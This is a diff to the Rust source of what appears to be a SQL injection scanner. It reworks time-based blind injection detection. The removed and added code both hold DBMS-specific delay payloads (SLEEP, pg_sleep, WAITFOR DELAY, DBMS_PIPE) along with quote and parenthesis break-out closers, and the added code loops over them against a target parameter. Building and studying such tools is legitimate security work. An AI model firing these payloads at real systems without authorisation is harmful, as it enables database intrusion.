@@ -140,53 +140,46 @@ pub async fn check_boolean_blind(request: &Request<'_>) -> Result<Option<BlindVe
 /// Number of seconds each time-based payload should delay the response.
 const TIME_DELAY: u64 = 5;
 
-/// A time-based probe: a DBMS-specific payload that sleeps `TIME_DELAY` seconds.
-struct TimeProbe {
-    dbms: DBMS,
-    prefix: &'static str,
-    suffix: &'static str,
-    true_code: &'static str,
-    payload: &'static str,
+/// A DBMS-specific delay clause. `And` is appended after `AND `; `Stacked` is a
+/// standalone statement appended after `; `.
+enum TimeClause {
+    And(&'static str),
+    Stacked(&'static str),
 }
 
-const TIME_PROBES: &[TimeProbe] = &[
-    // MySQL / MariaDB
-    TimeProbe { dbms: DBMS::MySQL, prefix: "1", suffix: "-- -",
-        true_code: "AND SLEEP(5)", payload: "1 AND SLEEP(5)-- -" },
-    TimeProbe { dbms: DBMS::MySQL, prefix: "1'", suffix: "-- -",
-        true_code: "AND SLEEP(5)", payload: "1' AND SLEEP(5)-- -" },
-    // PostgreSQL
-    TimeProbe { dbms: DBMS::PostgreSQL, prefix: "1", suffix: "-- -",
-        true_code: "AND (SELECT 1 FROM pg_sleep(5))", payload: "1 AND (SELECT 1 FROM pg_sleep(5))-- -" },
-    TimeProbe { dbms: DBMS::PostgreSQL, prefix: "1'", suffix: "-- -",
-        true_code: "AND (SELECT 1 FROM pg_sleep(5))", payload: "1' AND (SELECT 1 FROM pg_sleep(5))-- -" },
-    // Microsoft SQL Server (stacked WAITFOR)
-    TimeProbe { dbms: DBMS::MSSQL, prefix: "1", suffix: "-- -",
-        true_code: "; WAITFOR DELAY '0:0:5'", payload: "1; WAITFOR DELAY '0:0:5'-- -" },
-    TimeProbe { dbms: DBMS::MSSQL, prefix: "1'", suffix: "-- -",
-        true_code: "'; WAITFOR DELAY '0:0:5'", payload: "1'; WAITFOR DELAY '0:0:5'-- -" },
-    // Oracle
-    TimeProbe { dbms: DBMS::Oracle, prefix: "1", suffix: "-- -",
-        true_code: "AND 1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)",
-        payload: "1 AND 1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- -" },
-    TimeProbe { dbms: DBMS::Oracle, prefix: "1'", suffix: "-- -",
-        true_code: "AND 1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)",
-        payload: "1' AND 1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- -" },
+struct TimeDbms {
+    dbms: DBMS,
+    clause: TimeClause,
+}
+
+const TIME_DBMS: &[TimeDbms] = &[
+    TimeDbms { dbms: DBMS::MySQL, clause: TimeClause::And("SLEEP(5)") },
+    TimeDbms { dbms: DBMS::PostgreSQL, clause: TimeClause::And("(SELECT 1 FROM pg_sleep(5))") },
+    TimeDbms { dbms: DBMS::Oracle, clause: TimeClause::And("1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)") },
+    TimeDbms { dbms: DBMS::MSSQL, clause: TimeClause::Stacked("WAITFOR DELAY '0:0:5'") },
 ];
+
+/// Context closers tried after the original value to break out before the delay
+/// clause: numeric, single-quote, double-quote, and parenthesised variants.
+const TIME_CLOSERS: &[&str] = &["", "'", "\"", ")", "')", "\")"];
 
 /// Check if the target is vulnerable to time-based blind SQLi.
 ///
-/// Hardened over the original single-sample MySQL/PostgreSQL check:
-///  - establishes a stable baseline from the median of several samples;
-///  - covers MySQL, PostgreSQL, MSSQL (WAITFOR) and Oracle (DBMS_PIPE);
-///  - requires a *confirmatory* second delayed response before reporting, which
-///    rules out one-off network jitter.
+/// Seeds from the original parameter value and iterates DBMS delay clauses
+/// (MySQL SLEEP, PostgreSQL pg_sleep, Oracle DBMS_PIPE, MSSQL stacked WAITFOR)
+/// across numeric / single-quote / double-quote / parenthesised contexts, so
+/// double-quote and wrapped contexts (e.g. sqli-labs Less-10) are covered.
+/// Uses a median baseline and a confirmatory second delayed request to rule out
+/// network jitter.
 pub async fn check_time_blind(request: &Request<'_>) -> Result<Option<BlindVector>> {
+    let base = request.original_value();
+    let base = if base.trim().is_empty() { "1".to_string() } else { base };
+
     // Baseline: median of a few quick samples to absorb jitter.
     let mut samples = Vec::new();
     for _ in 0..3 {
         let start = Instant::now();
-        let _ = request.query_page("1").await?;
+        let _ = request.query_page(&base).await?;
         samples.push(start.elapsed());
     }
     samples.sort();
@@ -195,29 +188,41 @@ pub async fn check_time_blind(request: &Request<'_>) -> Result<Option<BlindVecto
     // A genuine delay must clear (DELAY - 1)s and be well above baseline.
     let threshold = Duration::from_secs(TIME_DELAY - 1).max(normal_time * 3);
 
-    for probe in TIME_PROBES {
-        let start = Instant::now();
-        let _ = request.query_page(probe.payload).await?;
-        if start.elapsed() < threshold {
-            continue;
-        }
+    for closer in TIME_CLOSERS {
+        let prefix = format!("{base}{closer}");
+        for td in TIME_DBMS {
+            let (payload, true_code) = match td.clause {
+                TimeClause::And(expr) => {
+                    (format!("{prefix} AND {expr}-- -"), format!("AND {expr}"))
+                }
+                TimeClause::Stacked(stmt) => {
+                    (format!("{prefix}; {stmt}-- -"), format!("; {stmt}"))
+                }
+            };
 
-        // Confirm with a second request to rule out a transient slow response.
-        let start = Instant::now();
-        let _ = request.query_page(probe.payload).await?;
-        if start.elapsed() < threshold {
-            continue;
-        }
+            let start = Instant::now();
+            let _ = request.query_page(&payload).await?;
+            if start.elapsed() < threshold {
+                continue;
+            }
 
-        return Ok(Some(BlindVector {
-            dbms: probe.dbms,
-            prefix: probe.prefix.to_string(),
-            suffix: probe.suffix.to_string(),
-            true_code: probe.true_code.to_string(),
-            false_code: "AND 1=1".to_string(),
-            time_based: true,
-            delay: TIME_DELAY,
-        }));
+            // Confirm with a second request to rule out a transient slow response.
+            let start = Instant::now();
+            let _ = request.query_page(&payload).await?;
+            if start.elapsed() < threshold {
+                continue;
+            }
+
+            return Ok(Some(BlindVector {
+                dbms: td.dbms,
+                prefix,
+                suffix: "-- -".to_string(),
+                true_code,
+                false_code: "AND 1=1".to_string(),
+                time_based: true,
+                delay: TIME_DELAY,
+            }));
+        }
     }
 
     Ok(None)
